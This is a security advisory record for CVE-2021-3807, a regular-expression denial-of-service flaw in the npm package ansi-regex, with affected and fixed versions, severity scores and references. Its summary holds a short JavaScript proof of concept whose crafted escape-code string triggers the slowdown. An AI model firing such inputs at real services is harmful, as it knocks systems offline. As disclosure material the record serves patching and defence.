advisory_id: GHSA-93q8-gq69-wqmw
datasource_id: github_osv_importer_v2/GHSA-93q8-gq69-wqmw
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/09/GHSA-93q8-gq69-wqmw/GHSA-93q8-gq69-wqmw.json
aliases:
  - CVE-2021-3807
summary: |
  Inefficient Regular Expression Complexity in chalk/ansi-regex
  ansi-regex is vulnerable to Inefficient Regular Expression Complexity which could lead to a denial of service when parsing invalid ANSI escape codes.

  **Proof of Concept**
  ```js
  import ansiRegex from 'ansi-regex';
  for(var i = 1; i <= 50000; i++) {
      var time = Date.now();
      var attack_str = "\u001B["+";".repeat(i*10000);
      ansiRegex().test(attack_str)
      var time_cost = Date.now() - time;
      console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
  }
  ```
  The ReDOS is mainly due to the sub-patterns `[[\\]()#;?]*` and `(?:;[-a-zA-Z\\d\\/#&.:=?%@~_]*)*`
impacted_packages:
  - purl: pkg:npm/ansi-regex
    affected_versions: vers:npm/>=6.0.0|<6.0.1
    fixed_versions: vers:npm/6.0.1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/ansi-regex
    affected_versions: vers:npm/>=5.0.0|<5.0.1
    fixed_versions: vers:npm/5.0.1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/ansi-regex
    affected_versions: vers:npm/>=4.0.0|<4.1.1
    fixed_versions: vers:npm/4.1.1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:npm/ansi-regex
    affected_versions: vers:npm/>=3.0.0|<3.0.1
    fixed_versions: vers:npm/3.0.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/09/GHSA-93q8-gq69-wqmw/GHSA-93q8-gq69-wqmw.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-1333
  - CWE-697
references:
  - url: https://app.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908
    reference_type:
    reference_id:
  - url: https://github.com/chalk/ansi-regex
    reference_type:
    reference_id:
  - url: https://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1
    reference_type:
    reference_id:
  - url: https://github.com/chalk/ansi-regex/commit/75a657da7af875b2e2724fd6331bf0a4b23d3c9a
    reference_type:
    reference_id:
  - url: https://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9
    reference_type:
    reference_id:
  - url: https://github.com/chalk/ansi-regex/commit/c3c0b3f2736b9c01feec0fef33980c43720dcde8
    reference_type:
    reference_id:
  - url: https://github.com/chalk/ansi-regex/issues/38#issuecomment-924086311
    reference_type:
    reference_id:
  - url: https://github.com/chalk/ansi-regex/issues/38#issuecomment-925924774
    reference_type:
    reference_id:
  - url: https://github.com/chalk/ansi-regex/releases/tag/v6.0.1
    reference_type:
    reference_id:
  - url: https://huntr.dev/bounties/5b3cf33b-ede0-4398-9974-800876dfd994
    reference_type:
    reference_id:
  - url: https://security.netapp.com/advisory/ntap-20221014-0002
    reference_type:
    reference_id:
  - url: https://www.oracle.com/security-alerts/cpuapr2022.html
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2021-3807
    reference_type:
    reference_id: CVE-2021-3807
